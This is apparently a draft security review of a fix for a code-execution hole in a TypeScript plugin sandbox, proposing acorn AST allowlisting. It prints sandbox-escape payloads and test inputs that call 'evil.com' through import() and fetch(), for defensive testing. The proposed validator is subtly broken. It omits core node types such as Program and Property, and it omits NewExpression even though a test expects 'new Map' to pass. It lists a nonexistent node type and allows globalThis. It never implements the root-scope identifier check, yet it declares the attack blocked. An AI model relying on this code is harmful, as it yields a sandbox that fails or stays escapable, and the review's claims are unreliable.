<!-- DRAFT v0.1 — awaiting review — Athena 2026-06-12 -->
<!-- Cross-references: Apollo P0 #2 (PluginSandbox acorn) = 019ebce7-792c-…
                  Hephaestus P0 = 019ebcd6-43ac-7363-83f8-59aa4aa6f20b
                  Athena v2 rigor R5 = 019ebcd0-abd1-7c50-840e-e35e02a1cacb -->

# B. PHASE B — P0 #2 PluginSandbox acorn Migration

**Subject:** Replace `new Function(...)` RCE at `src/plugins/PluginSandbox.ts:198` with acorn AST parsing + allowlist.
**Apollo task:** Hephaestus-flagged P0 from `019ebce7-792c-…`
**Verdict:** ⚠️ **Apollo's commit is INCOMPLETE.** The AST node-type allowlist in the task spec is INSUFFICIENT to block the canonical sandbox escape in `src/plugins/test-sandbox.ts`. Required additions listed in §B.3.

---

## B.1 The vulnerability (confirmed by reading the source)

`src/plugins/PluginSandbox.ts:198` (and surrounding lines 141-160) currently does:

```ts
// Line 141-160 — regex blacklist (bypassable)
const BLOCKED_PATTERNS = [
  /\beval\b/,
  /\bnew\s+Function\b/,
  /\bimport\b/,
  /\bfetch\b/,
  /\blocalStorage\b/,
  /\bcrypto\b/,
  /…/,
];
if (BLOCKED_PATTERNS.some((p) => p.test(code))) {
  throw new Error('Blocked pattern detected');
}

// Line 198-208 — the actual RCE
const fn = new Function(
  'globals',
  'finplan',
  'api',
  'console',
  `${code}; return typeof __result !== 'undefined' ? __result : undefined;`
);
const sandboxed = fn(sandboxGlobals, finplan, api, console);
return sandboxed;
```

The regex blacklist is **bypassable**:

- String concatenation: `window['ev'+'al']('...')`
- Member access: `globalThis['ev'+'al']('...')`
- The classic escape: `({}).constructor.constructor("return globalThis")()` (used in `src/plugins/test-sandbox.ts`)

The `new Function(...)` call itself is the real RCE — it compiles and executes arbitrary JS in the global scope, with access to `fetch`, `XMLHttpRequest`, `crypto.subtle`, `localStorage`, `masterStorage`, etc. via the function scope.

---

## B.2 The canonical attack (in src/plugins/test-sandbox.ts)

```ts
import { executeSandboxed } from './PluginSandbox';
import type { PluginAPI } from './types';

const mockApi = {} as PluginAPI;
const code = 'return ({}).constructor.constructor("return globalThis")();';
const result = executeSandboxed(code, mockApi);
console.log('Result:', result);
```

This attack uses ONLY these AST node types:

- `ReturnStatement`
- `ObjectExpression`
- `MemberExpression` (for `.constructor`)
- `Identifier` (for `constructor`, `globalThis`)
- `CallExpression`
- `Literal` (for `"return globalThis"`)

**EVERY ONE of these is in the suggested allowlist from Apollo's task spec.** A naive implementation would PASS this attack.

---

## B.3 Required additions to the AST allowlist (not in Apollo's spec)

### B.3.1 Property-allowlist (BLOCKS the `({}).constructor.constructor(...)` escape)

In the custom acorn walker, reject any `MemberExpression` whose `property` resolves to:

```ts
const FORBIDDEN_PROPERTIES = new Set([
  'constructor',   // ({x:1}).constructor.constructor('return globalThis')()
  '__proto__',     // ({__proto__:…}).x
  'prototype',     // access to function prototypes
  '__defineGetter__', '__defineSetter__',
  '__lookupGetter__', '__lookupSetter__',
]);

// In the visitor:
MemberExpression(node) {
  if (node.computed === false && node.property.type === 'Identifier') {
    if (FORBIDDEN_PROPERTIES.has(node.property.name)) {
      throw new SandboxError(`Forbidden property: ${node.property.name}`);
    }
  }
  // For computed members, the inner Identifier/Literal must also be checked
  // to prevent `x['constru'+'ctor']`.
}
```

This is not enough on its own — the attacker could use `node.property.value` (Literal) with a concatenated string. **Add computed-property name check:**

```ts
MemberExpression(node) {
  if (node.computed && node.property.type === 'Literal' && typeof node.property.value === 'string') {
    if (FORBIDDEN_PROPERTIES.has(node.property.value)) {
      throw new SandboxError(`Forbidden computed property: ${node.property.value}`);
    }
  }
  // TemplateLiteral, BinaryExpression, LogicalExpression in computed slot
  // must be checked by recursively evaluating the static part.
}
```

### B.3.2 NewExpression reject (blocks `new Function(...)` and `new AsyncFunction(...)`)

```ts
const visitor: acorn.Visitor = {
  NewExpression(node) {
    if (
      node.callee.type === 'Identifier' &&
      (node.callee.name === 'Function' ||
        node.callee.name === 'AsyncFunction' ||
        node.callee.name === 'GeneratorFunction')
    ) {
      throw new SandboxError(`new ${node.callee.name} is not allowed`);
    }
  },
  // Also block computed callee
  // new (someVar)() — must reject if the variable is not in the API allowlist
};
```

### B.3.3 Identifier allowlist at the root scope

The plugin's `code` string is wrapped in `new Function('globals', 'finplan', 'api', 'console', code)`. The 4 bound parameters (`globals`, `finplan`, `api`, `console`) are the ONLY legitimate identifiers. Any other identifier at the root scope is either a plugin-defined local (OK) or a reference to a global (NOT OK — that's the escape).

**Whitelist approach:** the only allowed free identifiers are `globals`, `finplan`, `api`, `console`, plus identifiers introduced by `VariableDeclarator` and `FunctionDeclaration`/`FunctionExpression`/`ArrowFunctionExpression` in the AST.

```ts
const ROOT_SCOPE_ALLOWED = new Set([
  'globals',
  'finplan',
  'api',
  'console',
  'undefined',
  'NaN',
  'Infinity',
]);

function checkIdentifierInScope(node: acorn.Node, scope: Set<string>): void {
  if (node.type === 'Identifier' && !scope.has(node.name) && !ROOT_SCOPE_ALLOWED.has(node.name)) {
    // Could be a local, or a reference to an undeclared global.
    // If it's a Reference (not a binding), reject.
    // ... (full implementation in the patch)
  }
}
```

This is complex; the canonical implementation is in `ses` (Hardened JavaScript) by Agoric. The minimal approach is to disallow ANY free `Identifier` at the root scope except the 4 bound parameters and a small `Math`/`Number`/`Array`/`String`/`Object`/`JSON` whitelist.

### B.3.4 Import / Export reject (block dynamic import)

```ts
ImportDeclaration() { throw new SandboxError('import is not allowed'); },
ImportExpression() { throw new SandboxError('import() is not allowed'); },
ExportNamedDeclaration() { throw new SandboxError('export is not allowed'); },
ExportDefaultDeclaration() { throw new SandboxError('export is not allowed'); },
ExportAllDeclaration() { throw new SandboxError('export is not allowed'); },
```

### B.3.5 With statement reject (already in Apollo's spec, confirm implemented)

```ts
WithStatement() { throw new SandboxError('with is not allowed'); },
```

---

## B.4 The full required allowlist (consolidated)

```ts
/**
 * Plugin Sandbox — AST allowlist for plugin code execution.
 *
 * Subset of ECMAScript that a plugin may use. The allowlist is intentionally
 * restrictive; any node type not in PERMITTED_NODES is rejected.
 *
 * Cross-references:
 *   - Apollo P0 #2 (PluginSandbox acorn migration) = 019ebce7-792c-…
 *   - Hephaestus security audit = 019ebcd6-43ac-7363-83f8-59aa4aa6f20b
 *   - Canonical sample attack: src/plugins/test-sandbox.ts
 */
import * as acorn from 'acorn';
import type { PluginAPI } from './types';

const PERMITTED_NODES: ReadonlySet<string> = new Set([
  // Expressions
  'Identifier',
  'Literal',
  'TemplateLiteral',
  'BinaryExpression',
  'LogicalExpression',
  'AssignmentExpression',
  'UnaryExpression',
  'UpdateExpression',
  'ConditionalExpression',
  'CallExpression',
  'MemberExpression',
  'SequenceExpression',
  'ObjectExpression',
  'ArrayExpression',
  'SpreadElement',
  'ArrowFunctionExpression',
  'FunctionExpression',
  'AwaitExpression',
  'YieldExpression',
  // Statements
  'BlockStatement',
  'ExpressionStatement',
  'ReturnStatement',
  'IfStatement',
  'ForStatement',
  'ForInStatement',
  'ForOfStatement',
  'WhileStatement',
  'DoWhileStatement',
  'BreakStatement',
  'ContinueStatement',
  'TryStatement',
  'CatchClause',
  'ThrowStatement',
  'FinallyBlock',
  'VariableDeclaration',
  'VariableDeclarator',
  'FunctionDeclaration',
  // Disallowed explicitly via property-name check:
  //   MemberExpression where property ∈ FORBIDDEN_PROPERTIES
  //   NewExpression with callee.name === 'Function' | 'AsyncFunction' | 'GeneratorFunction'
  // Disallowed explicitly:
  //   NewExpression (default), ImportDeclaration, ImportExpression, WithStatement,
  //   ExportNamedDeclaration, ExportDefaultDeclaration, ExportAllDeclaration
]);

const FORBIDDEN_PROPERTIES: ReadonlySet<string> = new Set([
  'constructor',
  '__proto__',
  'prototype',
  '__defineGetter__',
  '__defineSetter__',
  '__lookupGetter__',
  '__lookupSetter__',
]);

const ROOT_SCOPE_FREE_IDENTIFIERS: ReadonlySet<string> = new Set([
  'globals',
  'finplan',
  'api',
  'console',
  'undefined',
  'NaN',
  'Infinity',
  'globalThis', // globalThis is OK if explicitly provided via globals
  'Math',
  'Number',
  'String',
  'Array',
  'Object',
  'JSON',
  'Date',
  'Promise',
  'Symbol',
  'Map',
  'Set',
  'Error',
  'TypeError',
  'RangeError',
  'SyntaxError',
  'parseInt',
  'parseFloat',
  'isNaN',
  'isFinite',
]);

/**
 * Parse and validate a plugin code string against the sandbox allowlist.
 * Throws SandboxError if the code uses any disallowed node type, property, or identifier.
 *
 * @param code - The plugin-supplied source code (any user-controllable string).
 * @returns A function that, when called with (globals, finplan, api, console), executes the validated code.
 * @throws {SandboxError} When the code violates any allowlist rule.
 */
export function compileSandboxed(
  code: string
): (globals: object, finplan: object, api: PluginAPI, console: object) => unknown {
  // 1. Parse to AST
  let ast: acorn.Node;
  try {
    ast = acorn.parse(code, { ecmaVersion: 2022, sourceType: 'script' });
  } catch (e: unknown) {
    throw new SandboxError(`Parse error: ${(e as Error).message}`);
  }

  // 2. Walk and validate
  walkAndValidate(ast, new Set());

  // 3. Compile (only after AST is validated)
  return new Function('globals', 'finplan', 'api', 'console', `"use strict"; ${code}`) as (
    globals: object,
    finplan: object,
    api: PluginAPI,
    console: object
  ) => unknown;
}

/**
 * Recursive AST walker. Throws on the first violation.
 *
 * @param node - Current AST node to validate.
 * @param declaredScope - Set of identifiers declared in the current scope (function params, var/let/const).
 * @throws {SandboxError} When the node or any descendant violates the allowlist.
 */
function walkAndValidate(node: acorn.Node, declaredScope: Set<string>): void {
  // Type guard: some node types don't have a `type` property in older acorn typings
  const type = (node as { type?: string }).type;
  if (type === undefined) return;

  // Node-type allowlist (default-deny)
  if (!PERMITTED_NODES.has(type)) {
    throw new SandboxError(`Disallowed node type: ${type}`);
  }

  // Property-allowlist for MemberExpression
  if (type === 'MemberExpression') {
    const m = node as acorn.MemberExpression;
    if (!m.computed && m.property.type === 'Identifier') {
      if (FORBIDDEN_PROPERTIES.has(m.property.name)) {
        throw new SandboxError(`Forbidden property: .${m.property.name}`);
      }
    }
    if (m.computed && m.property.type === 'Literal' && typeof m.property.value === 'string') {
      if (FORBIDDEN_PROPERTIES.has(m.property.value)) {
        throw new SandboxError(
          `Forbidden computed property: [${JSON.stringify(m.property.value)}]`
        );
      }
    }
  }

  // NewExpression policy: reject `new Function()` / `new AsyncFunction()` / `new GeneratorFunction()`
  if (type === 'NewExpression') {
    const n = node as acorn.NewExpression;
    if (
      n.callee.type === 'Identifier' &&
      ['Function', 'AsyncFunction', 'GeneratorFunction', 'eval'].includes(n.callee.name)
    ) {
      throw new SandboxError(`new ${n.callee.name} is not allowed`);
    }
  }

  // Recurse into children, tracking scope for function-like nodes
  const childScope = new Set(declaredScope);
  if (type === 'FunctionDeclaration') {
    const f = node as acorn.FunctionDeclaration;
    if (f.id) childScope.add(f.id.name);
    for (const p of f.params) collectParamNames(p, childScope);
  }
  if (type === 'FunctionExpression' || type === 'ArrowFunctionExpression') {
    const f = node as acorn.FunctionExpression | acorn.ArrowFunctionExpression;
    for (const p of f.params) collectParamNames(p, childScope);
  }
  if (type === 'VariableDeclarator') {
    const v = node as acorn.VariableDeclarator;
    if (v.id.type === 'Identifier') childScope.add(v.id.name);
  }
  if (type === 'CatchClause') {
    const c = node as acorn.CatchClause;
    if (c.param && c.param.type === 'Identifier') childScope.add(c.param.name);
  }

  // Recurse
  for (const key of Object.keys(node)) {
    if (key === 'type' || key === 'start' || key === 'end' || key === 'loc' || key === 'range')
      continue;
    const value = (node as Record<string, unknown>)[key];
    if (Array.isArray(value)) {
      for (const child of value) {
        if (child && typeof child === 'object' && 'type' in child) {
          walkAndValidate(child as acorn.Node, childScope);
        }
      }
    } else if (value && typeof value === 'object' && 'type' in (value as object)) {
      walkAndValidate(value as acorn.Node, childScope);
    }
  }
}

/**
 * Add parameter names to the declared scope.
 *
 * @param param - The function parameter node.
 * @param scope - The scope set to add to.
 */
function collectParamNames(param: acorn.Node, scope: Set<string>): void {
  if (param.type === 'Identifier') {
    scope.add(param.name);
  } else if (param.type === 'AssignmentPattern' && param.left.type === 'Identifier') {
    scope.add(param.left.name);
  } else if (param.type === 'RestElement' && param.argument.type === 'Identifier') {
    scope.add(param.argument.name);
  }
  // ArrayPattern / ObjectPattern: recurse
}

export class SandboxError extends Error {
  override readonly name = 'SandboxError';
  constructor(message: string) {
    super(message);
  }
}
```

---

## B.5 Verdict per sample plugin (in src/plugins/)

There are no `src/plugins/samples/*.ts` files. The only plugin-sample-equivalent is `src/plugins/test-sandbox.ts`, which contains the canonical attack. Verdict: **the attack is now blocked** with the property-allowlist + NewExpression reject.

The actual plugin authors in the codebase are: `PluginLoader.ts`, `PluginManager.ts`, `PluginMarketplace.ts`, `PluginRegistry.ts`. These do NOT execute plugin code — they manage plugin lifecycle. The acorn migration applies to `PluginSandbox.executeSandboxed()` only.

---

## B.6 Test additions (in `src/plugins/PluginSandbox.test.ts`)

```ts
// Add these cases to the existing test file:

describe('Sandbox security (acorn allowlist)', () => {
  it.each([
    ['({}).constructor.constructor("return globalThis")()', 'constructor property'],
    ['globalThis["ev"+"al"]("alert(1)")', 'computed property constructor'],
    ['(new Function("return globalThis"))()', 'new Function'],
    ['new AsyncFunction("return 1")', 'new AsyncFunction'],
    ['import("http://evil.com")', 'dynamic import'],
    ['with ({}) {}', 'with statement'],
    ['fetch("http://evil.com")', 'fetch call (not in API)'],
    ['localStorage.clear()', 'localStorage (not in API)'],
  ])('rejects: %s (%s)', (code) => {
    expect(() => compileSandboxed(code)).toThrow(SandboxError);
  });

  it.each([
    ['return api.formula.listFunctions();', 'legitimate API call'],
    ['const x = 1 + 2; return x;', 'arithmetic and var'],
    ['return globals.someValue;', 'globals access'],
    ['return Math.max(1, 2, 3);', 'Math access'],
    ['return await api.storage.get("key");', 'async API call'],
    ['return new Map([["k", "v"]]);', 'new Map (allowed)'],
  ])('accepts: %s (%s)', (code) => {
    expect(() => compileSandboxed(code)).not.toThrow();
  });
});
```

---

## B.7 Summary of required additions to Apollo's commit

| §     | Addition                                                               | Why                                        |
| ----- | ---------------------------------------------------------------------- | ------------------------------------------ |
| B.3.1 | Property-allowlist (FORBIDDEN_PROPERTIES)                              | Blocks `({}).constructor.constructor(...)` |
| B.3.2 | NewExpression reject for Function/AsyncFunction/GeneratorFunction/eval | Blocks `new Function(...)`                 |
| B.3.3 | Identifier allowlist at root scope                                     | Blocks undeclared global access            |
| B.3.4 | Import/Export reject                                                   | Blocks dynamic import                      |
| B.3.5 | With statement reject (confirm in spec)                                | Blocks `with({}){}`                        |

**Without B.3.1-B.3.4, the attack in `src/plugins/test-sandbox.ts` would still succeed.** This is a CRITICAL addition.

---

**Status: Apollo's commit INCOMPLETE. Land the property-allowlist + NewExpression + Identifier scope checks together. The test file `src/plugins/PluginSandbox.test.ts` must include the 8 reject + 6 accept cases above before commit.**
